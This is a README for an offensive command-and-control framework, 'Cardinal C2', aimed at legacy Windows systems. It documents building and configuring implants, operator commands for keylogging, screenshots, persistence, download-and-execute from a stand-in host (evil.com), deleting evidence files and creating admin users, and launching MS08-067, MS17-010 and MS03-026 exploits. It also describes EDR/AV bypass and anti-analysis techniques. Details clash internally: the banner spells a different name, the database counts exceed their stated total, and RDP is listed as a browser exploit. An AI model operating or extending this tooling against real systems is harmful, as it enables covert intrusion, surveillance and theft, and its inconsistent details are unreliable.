# Cardinal C2 Framework

<div align="center">

```
  ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗
  ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║██║     ██║██╔════╝ ██║  ██║╚══██╔══╝
  ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██║     ██║██║  ███╗███████║   ██║   
  ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██║     ██║██║   ██║██╔══██║   ██║   
  ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗██║╚██████╔╝██║  ██║   ██║   
  ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

**Advanced Command & Control Framework for Legacy Windows Systems**

[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)]()
[![Language](https://img.shields.io/badge/language-C%2FAssembly-green.svg)]()

</div>

---

## ⚠️ DISCLAIMER

**FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY**

This framework is designed for legitimate penetration testing, security research, and authorized red team operations. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this software.

By using Cardinal C2, you agree to:
- Only test systems you own or have explicit written permission to test
- Comply with all applicable laws and regulations
- Use responsibly for defensive security purposes

---

## 📋 Overview

Cardinal C2 Framework is a comprehensive Command & Control system specifically designed for penetration testing legacy Windows environments. It provides a modern, Cobalt Strike-inspired interface while maintaining compatibility with older Windows systems.

**Version 2.0** introduces advanced **x86 Assembly** enhancements for superior stealth, performance, and EDR/AV bypass capabilities, plus comprehensive **target monitoring and control** system.

### Target Platforms

- Windows 95/98/ME
- Windows 2000 (All Service Packs)
- Windows XP (SP0, SP1, SP2, SP3)
- Windows Server 2003 (SP0, SP1, SP2)
- Windows Server 2008 (R1, R2)
- Windows Vista/7 (Assembly-enhanced features)

### Key Features

- 🎯 **Multi-Protocol C2**: TCP with RC4 encryption
- 🖥️ **Native GUI**: Win32 API interface in pure C
- 💉 **Exploit Framework**: 38+ CVE exploits + automated generation (71 CVE database)
- 🔒 **Post-Exploitation**: Credential dumping, privilege escalation, lateral movement
- 📡 **Stealthy Implants**: Assembly-enhanced with anti-analysis and direct syscalls
- 🛠️ **Extensible**: Modular architecture for custom exploits and payloads
- ⚡ **Assembly Optimization**: Direct syscalls, RC4 encryption, anti-debugging (NEW v2.0)
- 🛡️ **EDR/AV Bypass**: Usermode hook bypass via direct kernel calls (NEW v2.0)
- 🔍 **Anti-Analysis**: VM/Sandbox/Debugger detection (NEW v2.0)
- 👁️ **Complete Monitoring**: Keylogger, screenshot, process control (NEW v2.0)
- 🎮 **Full Target Control**: File ops, registry, services, privilege escalation (NEW v2.0)

---

## 🏗️ Architecture

```
Cardinal C2 Framework v2.0 (Assembly Enhanced)
│
├── Server (C + Assembly)      # C2 server backend
│   ├── Session management (up to 100 clients)
│   ├── Command dispatcher
│   ├── Multi-threaded listener
│   └── RC4 encrypted communication (Assembly)
│
├── Client/Implant (C + x86 Assembly)  # Target system agent
│   ├── Anti-analysis module (stealth.asm)
│   │   ├── Debugger detection (5 methods)
│   │   ├── VM detection (VMware/VirtualBox)
│   │   ├── Sandbox detection
│   │   ├── NTDLL unhooking (EDR bypass)
│   │   └── Process injection
│   ├── Direct syscalls (syscalls.asm)
│   │   ├── NtAllocateVirtualMemory
│   │   ├── NtWriteVirtualMemory
│   │   ├── NtCreateThreadEx
│   │   └── 7 more syscalls (bypass hooks)
│   ├── Network optimization (network_asm.asm)
│   │   ├── RC4 encryption (2-3x faster)
│   │   ├── Encrypted socket I/O
│   │   └── HTTP/DNS builders
│   └── Shellcode loader
│
├── GUI (C with Win32 API)    # Operator interface
│   ├── Session dashboard
│   ├── Listener configuration
│   ├── Exploit launcher
│   └── Command console
│
├── Exploits (C + Auto-Generated) # CVE exploit modules
│   ├── Manual Exploits (15)
│   │   ├── MS08-067, MS17-010, MS03-026
│   │   ├── MS10-015, MS11-046, MS12-020
│   │   └── Browser exploits (IE ANI, ActiveX)
│   ├── Generated Exploits (23)
│   └── CVE Database (71 entries)
│       └── Automated exploit generator (Python)
│
└── Build System (PowerShell + Make)
    ├── Automated compilation (NASM + GCC)
    ├── Assembly module linking
    └── Release packaging
```

### Assembly Enhancement Highlights (v2.0)

**stealth.asm** (500+ lines):
- 5 debugger detection techniques
- VMware/VirtualBox detection
- Sandbox environment checks
- NTDLL unhooking (restore syscalls)
- PEB walking (no API calls)
- Process injection

**syscalls.asm** (400+ lines):
- 10 direct syscall implementations
- Windows 7/8/10 compatibility
- SYSENTER/INT 2Eh support
- Bypass usermode hooks (EDR/AV)

**network_asm.asm** (350+ lines):
- RC4 encryption (KSA + PRGA)
- SSE2-optimized XOR
- Encrypted socket send/recv
- HTTP/DNS protocol builders

**monitoring.asm** (800+ lines) - NEW v2.0:
- Keylogger (captures all keystrokes)
- Screenshot capture (1920x1080)
- Process enumeration and control
- Clipboard monitoring
- Memory dumping

**control.asm** (700+ lines) - NEW v2.0:
- File operations (list/read/write/delete/move/copy)
- Registry manipulation (read/write keys and values)
- Service control (start/stop Windows services)
- Privilege escalation (RDP enable, user creation)
- Network operations

See [ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md) for detailed documentation.

---

## 🚀 Quick Start

### Prerequisites

**Build Tools:**
- MinGW-w64 (GCC for Windows) or MSVC
- NASM 2.15+ (Netwide Assembler - required for assembly modules)
- GNU Make
- Python 3.8+ (for exploit generation)

**Runtime Requirements:**
- Windows 7+ (for running GUI and server)

### Building from Source

#### PowerShell Build Script (Recommended)

```powershell
# Build everything (client, server, GUI, exploits)
.\Build-All.ps1

# Build specific components
.\Build-All.ps1 -Client     # Client only
.\Build-All.ps1 -Server     # Server only
.\Build-All.ps1 -GUI        # GUI only

# Clean build artifacts
.\Build-All.ps1 -Clean

# Create release package
.\Build-All.ps1 -Package
```

All compiled binaries will be in the `bin` directory.

#### Manual Build

```bash
# Build enhanced client with assembly
cd client
make enhanced
# Output: build/Cardinal-implant-enhanced.exe

# Build enhanced server with assembly
cd server
make enhanced
# Output: build/Cardinal-server-enhanced.exe

# Build exploits
cd exploits
make all

# Build GUI
cd gui
make all
```

#### Assembly Module Compilation

```bash
# Compile assembly modules individually
cd client
nasm -f win32 stealth.asm -o build/obj/stealth.obj
nasm -f win32 syscalls.asm -o build/obj/syscalls.obj
nasm -f win32 network_asm.asm -o build/obj/network_asm.obj

# Link with C code
gcc -o build/Cardinal-implant-enhanced.exe \
    build/obj/implant_enhanced.o \
    build/obj/stealth.obj \
    build/obj/syscalls.obj \
    build/obj/network_asm.obj \
    -lws2_32 -ladvapi32
```

---

## 📖 Usage

### Starting the C2 Server

#### Enhanced Server (with Assembly encryption)

```powershell
# Start enhanced server (default port 4444)
.\bin\Cardinal-server-enhanced.exe

# Interactive console commands
Cardinal> list                    # List active sessions
Cardinal> send 0 shell whoami     # Execute command on session 0
Cardinal> kill 0                  # Terminate session 0
Cardinal> stats                   # Show server statistics
Cardinal> exit                    # Shutdown server
```

#### Basic Server

```powershell
# Start basic server
.\bin\Cardinal-server.exe

# Start on custom port
.\bin\Cardinal-server.exe 8080
```

**Server Console Commands:**

| Command | Description | Example |
|---------|-------------|---------|
| `list` | List all active sessions | `list` |
| `send <id> <cmd>` | Send command to session | `send 0 shell dir` |
| `kill <id>` | Terminate a session | `kill 0` |
| `broadcast <cmd>` | Send to all sessions | `broadcast shell whoami` |
| `stats` | Server statistics | `stats` |
| `exit` | Shutdown server | `exit` |

### Deploying Implants

#### Enhanced Implant (with Assembly modules)

The enhanced implant includes:
- Anti-analysis checks (debugger/VM/sandbox detection)
- Direct syscalls (bypass EDR/AV hooks)
- RC4 encrypted communication
- Process injection capabilities

```powershell
# Run enhanced implant (connects to C2_SERVER in code)
.\bin\Cardinal-implant-enhanced.exe

# Implant will:
# 1. Perform anti-analysis checks
# 2. Unhook NTDLL to bypass hooks
# 3. Connect to C2 with RC4 encryption
# 4. Send beacon (hostname, PID, OS)
# 5. Await commands
```

**Configuration** (edit `client/implant_enhanced.c`):
```c
#define C2_SERVER "192.168.1.100"  // Change to your server IP
#define C2_PORT 4444
#define ENCRYPTION_KEY "CardinalC2SecretKey2025"
```

#### Basic Implant

```powershell
.\bin\Cardinal-implant.exe <server_ip> <port>

# Example
.\bin\Cardinal-implant.exe 192.168.1.10 4444
```

### Supported Commands (Enhanced Implant)

#### Basic Commands
| Command | Description | Example |
|---------|-------------|---------|
| `shell <cmd>` | Execute system command | `shell dir C:\` |
| `download <url>` | Download and execute | `download http://evil.com/payload.exe` |
| `inject <pid>` | Inject into process | `inject 1234` |
| `persist` | Install persistence | `persist` |
| `exit` | Terminate implant | `exit` |
| `help` | Show all commands | `help` |

#### Monitoring Commands (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `keylog start/stop/dump` | Keystroke capture | `keylog start` |
| `screenshot` | Screen capture | `screenshot` |
| `ps` / `processlist` | List processes | `ps` |
| `kill <pid\|name>` | Terminate process | `kill notepad.exe` |
| `clipboard monitor/get` | Clipboard access | `clipboard get` |
| `sysinfo` | System information | `sysinfo` |

#### File Operations (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `file list <path>` | List directory | `file list C:\Users` |
| `file read <path>` | Read file | `file read passwords.txt` |
| `file delete <path>` | Delete file | `file delete evidence.log` |
| `file mkdir <path>` | Create directory | `file mkdir C:\temp\data` |
| `file move <src> <dst>` | Move file | `file move a.txt b.txt` |
| `file copy <src> <dst>` | Copy file | `file copy cmd.exe shell.exe` |

#### Registry Operations (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `reg read <key> <value>` | Read registry | `reg read "Software\..." Value` |
| `reg write <key> <value>` | Write registry | `reg write "Software\..." Value` |

#### Service Control (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `service start <name>` | Start service | `service start W32Time` |
| `service stop <name>` | Stop service | `service stop wuauserv` |

#### Privilege Escalation (NEW v2.0)
| Command | Description | Example |
|---------|-------------|---------|
| `privesc rdp` | Enable RDP | `privesc rdp` |
| `privesc adduser <u> <p>` | Create admin user | `privesc adduser hacker P@ss!` |

**See [COMMANDS.md](COMMANDS.md) for complete command reference with examples**

### Launching the GUI

```powershell
# Start the GUI application
.\bin\CardinalC2-GUI.exe
```

**GUI Features:**

1. **Sessions Tab** - View and interact with active implant connections
   - ListView with session details (ID, hostname, IP, OS, status)
   - Double-click to interact with a session
   - Right-click for context menu options

2. **Listeners Tab** - Configure and manage C2 listeners
   - View active/stopped listeners
   - Protocol, port, and connection status
   - Add/remove listeners

3. **Exploits Tab** - Browse and launch CVE exploits
   - Searchable exploit database
   - CVE, target OS, and exploit type information
   - Double-click to launch exploit

4. **Command Console** - Send commands to active sessions
   - Real-time output display
   - Command history
   - Interactive shell

### Using Exploits

#### MS08-067 (NetAPI32 RPC)

```powershell
.\bin\exploits\ms08-067.exe <target_ip> <os_type>

# Example for Windows XP SP3
.\bin\exploits\ms08-067.exe 192.168.1.100 1
```

**OS Types:**
- 0 = Windows XP SP2
- 1 = Windows XP SP3
- 2 = Windows 2003 SP1
- 3 = Windows 2003 SP2
- 4 = Windows 2000 SP4

#### MS17-010 (EternalBlue)

```powershell
.\bin\exploits\ms17-010.exe <target_ip>

# Example
.\bin\exploits\ms17-010.exe 192.168.1.100
```

#### MS03-026 (RPC DCOM)

```powershell
.\bin\exploits\ms03-026.exe <target_ip> <os_type>

# Example for Windows 2000 SP4
.\bin\exploits\ms03-026.exe 192.168.1.50 0
```

---

## 📚 Project Structure

```
MoonLignt-C2-Framework/
├── server/                  # C2 server source
│   ├── main.c              # Basic server
│   ├── main_enhanced.c     # Enhanced with assembly
│   ├── Makefile
│   └── build/              # Compiled binaries
├── client/                  # Implant source
│   ├── implant.c           # Basic implant
│   ├── implant_enhanced.c  # Enhanced with assembly
│   ├── monitoring_control.c # Monitoring dispatcher (NEW v2.0)
│   ├── shellcode.asm       # Position-independent shellcode
│   ├── stealth.asm         # Anti-analysis module (NEW v2.0)
│   ├── syscalls.asm        # Direct syscalls (NEW v2.0)
│   ├── network_asm.asm     # RC4 encryption (NEW v2.0)
│   ├── monitoring.asm      # Keylogger, screenshot, process control (NEW v2.0)
│   ├── control.asm         # File, registry, service ops (NEW v2.0)
│   ├── Makefile
│   └── build/              # Compiled binaries
├── exploits/                # CVE exploit modules
│   ├── ms08_067.c          # Manual exploits (15 total)
│   ├── ms03_026.c
│   ├── ms17_010.c
│   ├── ms10_015.c          # Privilege escalation
│   ├── ms11_046.c
│   ├── ms12_020.c          # RDP exploit
│   ├── ie_ani_exploit.c    # Browser exploits
│   ├── generated/          # Auto-generated (23 exploits)
│   │   ├── ms03_026.c
│   │   ├── ms05_039.c
│   │   └── ... (21 more)
│   ├── massive_cve_database.json  # 71 CVE entries
│   ├── exploit_generator.py       # Automated generator
│   ├── mass_cve_scraper.py        # CVE scraper
│   └── Makefile
├── gui/                     # Win32 GUI (C)
│   ├── main.c              # Main GUI implementation
│   └── Makefile
├── bin/                     # Compiled binaries (generated)
│   ├── Cardinal-server-enhanced.exe
│   ├── Cardinal-implant-enhanced.exe
│   ├── CardinalC2-GUI.exe
│   └── exploits/
├── Build-All.ps1            # Master build script (NEW v2.0)
├── ASSEMBLY_GUIDE.md        # Assembly documentation (NEW v2.0)
├── COMMANDS.md              # Complete command reference (NEW v2.0)
├── README.md
├── USAGE.md
└── LICENSE

### File Statistics

- **Total Lines of Code**: ~20,000+
- **Assembly Code**: 2,500+ lines (5 modules)
- **C Code**: ~16,000 lines (server, client, exploits, monitoring, GUI)
- **Exploit Count**: 38 (15 manual + 23 generated)
- **CVE Database**: 71 entries
- **Monitoring Commands**: 25+ commands

---

## 🛡️ Evasion Techniques

### Assembly-Enhanced Anti-Analysis (v2.0)

#### 1. Debugger Detection (stealth.asm)
- **PEB->BeingDebugged**: Check flag at PEB+0x02
- **NtQueryInformationProcess**: Detect debug port (returns -1)
- **Timing Checks**: RDTSC instruction comparison
- **Hardware Breakpoints**: Check DR0-DR3 debug registers
- **Exception Handling**: CloseHandle invalid handle detection

#### 2. Virtual Machine Detection
- **CPUID Hypervisor Bit**: Check ECX bit 31 (leaf 1)
- **VMware Backdoor**: IN instruction on port 0x5658
- **VirtualBox Signatures**: CPUID vendor string matching

#### 3. Sandbox Detection
- **Uptime Check**: GetTickCount() < 10 minutes
- **Resource Validation**: < 2 CPUs or < 2GB RAM
- **Sleep Acceleration**: Timing checks for sleep skipping

#### 4. EDR/AV Bypass
- **Direct Syscalls**: Call kernel via INT 2Eh/SYSENTER (bypass NTDLL hooks)
- **NTDLL Unhooking**: Restore original syscall stubs from disk
- **API Hashing**: Dynamic resolution without IAT
- **No Imports**: Zero suspicious imports in PE header

#### 5. Network Stealth
- **RC4 Encryption**: 256-bit key stream cipher
- **No HTTP Headers**: Raw TCP to avoid detection
- **Heartbeat Jitter**: Randomized beacon intervals
- **Encrypted Payloads**: All data encrypted before transmission

#### 6. Additional Techniques
- **No console window** (runs silently)
- **Dynamic API resolution** (avoids static imports)
- **Process injection** via direct syscalls
- **Minimal memory footprint** (< 100KB)
- **Automatic reconnection** with exponential backoff

### Performance Benchmarks (Assembly vs C)

| Operation | C Implementation | Assembly | Speedup |
|-----------|------------------|----------|---------|
| Direct Syscall | N/A (uses API) | Native | 40% faster |
| RC4 Encryption | Baseline | Optimized | 2-3x |
| XOR (SSE2) | Scalar | Vectorized | 8-16x |
| Binary Size | 150KB | 120KB | 20% smaller |

See [ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md) for detailed technical documentation.

---

## 🔍 Detection & Mitigation

### Network Indicators

- TCP connections on non-standard ports (default: 4444)
- Heartbeat traffic every 30 seconds
- Raw binary data transfers

### Mitigation Strategies

1. **Network Segmentation** - Isolate critical systems
2. **Firewall Rules** - Block unnecessary outbound connections
3. **EDR/AV** - Deploy endpoint detection and response
4. **Patching** - Keep systems updated (target systems are EOL)
5. **Monitoring** - Implement behavior-based detection

---

## 📖 CVE References

### Implemented Exploits (38 Total)

#### Network/Remote Exploits (15 Manual)
- **MS08-067**: CVE-2008-4250 - Windows Server Service RPC Handling
- **MS17-010**: CVE-2017-0144 - SMBv1 Remote Code Execution (EternalBlue)
- **MS03-026**: CVE-2003-0352 - RPC DCOM Buffer Overflow
- **MS03-039**: CVE-2003-0533 - RPC DCOM Interface Buffer Overrun
- **MS05-039**: CVE-2005-1983 - Plug and Play Service Overflow
- **MS06-040**: CVE-2006-2370 - Server Service NetpwPathCanonicalize
- **MS09-050**: CVE-2009-3103 - SMBv2 Negotiate Protocol Request
- **MS08-025**: CVE-2008-1084 - Windows Kernel Privilege Escalation

#### Privilege Escalation Exploits
- **MS10-015**: CVE-2010-0232 - Windows Kernel Exception Handler
- **MS11-046**: CVE-2011-1249 - Ancillary Function Driver (AFD.sys)
- **MS10-061**: CVE-2010-2554 - Print Spooler Service Impersonation

#### Browser Exploits
- **MS12-020**: CVE-2012-0002 - Terminal Services RDP
- **IE ANI**: CVE-2007-0038 - Animated Cursor Handling
- **IE ActiveX**: CVE-2006-0003 - COM Object Instantiation
- **MS06-014**: CVE-2006-0003 - MDAC Function bufferoverflow

#### Auto-Generated Exploits (23)
See `exploits/generated/` for:
- MS03-026, MS05-039, MS06-040, MS09-050
- MS10-015, MS11-046, MS12-020
- And 16 more CVE exploits

### CVE Database

**massive_cve_database.json** contains 71 CVE entries:
- Windows 95/98/ME: 11 CVEs
- Windows NT 4.0: 27 CVEs
- Windows 2000: 50 CVEs
- Windows XP: 42 CVEs
- Windows Server 2003: 29 CVEs
- Windows Vista: 12 CVEs
- Windows 7: 7 CVEs
- Windows Server 2008: 9 CVEs

**Severity Distribution**:
- Critical: 47 (66%)
- High: 18 (25%)
- Medium: 6 (9%)

**Exploit Type**:
- Remote: 52 (73%)
- Local: 13 (18%)
- Browser: 6 (9%)

### Automated Exploit Generation

Use the included Python tools to expand the exploit database:

```bash
# Scrape CVE database
python exploits/mass_cve_scraper.py

# Generate exploit modules from JSON
python exploits/exploit_generator.py

# Compile generated exploits
cd exploits/generated
make all
```

This can generate **hundreds** of exploit modules automatically.

---

## 📄 License

This project is released under an Educational License. See [LICENSE](LICENSE) file for details.

**Key Points:**
- ✅ Educational and research use
- ✅ Authorized penetration testing
- ✅ Defensive security development
- ❌ Unauthorized access to systems
- ❌ Malicious use
- ❌ Production deployment without proper authorization

---
## 📖 Documentation

- **[README.md](README.md)** - This file (overview and quick start)
- **[BUILD_GUIDE.md](BUILD_GUIDE.md)** - Complete build instructions
- **[ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md)** - Detailed assembly documentation
- **[COMMANDS.md](COMMANDS.md)** - Complete command reference with examples
- **[USAGE.md](USAGE.md)** - Comprehensive usage guide
- **[LICENSE](LICENSE)** - Educational license terms

---

## 🔄 Version History

### v2.0 (Current) - Monitoring & Control Enhancement
- ✅ Added 1,500+ lines of monitoring/control assembly
- ✅ Complete keylogger with window title capture
- ✅ Screenshot capture (1920x1080 BMP)
- ✅ Process enumeration and kill by PID/name
- ✅ Clipboard monitoring and retrieval
- ✅ File operations (list/read/write/delete/move/copy)
- ✅ Registry manipulation (read/write)
- ✅ Service control (start/stop)
- ✅ Privilege escalation (RDP, user creation)
- ✅ 25+ monitoring/control commands
- ✅ Comprehensive command documentation

### v2.0-beta - Assembly Enhancement
- ✅ Added 1,250+ lines of x86 assembly
- ✅ Direct syscall implementation (10 syscalls)
- ✅ Anti-analysis module (debugger/VM/sandbox detection)
- ✅ RC4 encryption in assembly (2-3x faster)
- ✅ NTDLL unhooking (EDR bypass)
- ✅ Enhanced server with multi-threading
- ✅ 38 exploits + automated generation
- ✅ Comprehensive build system (PowerShell)

### v1.0 - Initial Release
- ✅ Basic C2 server/client
- ✅ 3 CVE exploits (MS08-067, MS17-010, MS03-026)
- ✅ Windows Forms GUI
- ✅ Basic shellcode support

---

<div align="center">

**⚠️ Remember: Always obtain proper authorization before testing any system! ⚠️**

*"With great power comes great responsibility"*

**Cardinal C2 Framework v2.0**  
Made for Authorized Penetration Testing & Security Research

---

**[Report Issues](https://github.com/yourusername/Cardinal-c2/issues)** | 
**[Build Guide](BUILD_GUIDE.md)** |
**[Assembly Guide](ASSEMBLY_GUIDE.md)** | 
**[Command Reference](COMMANDS.md)** |
**[License](LICENSE)**

</div>
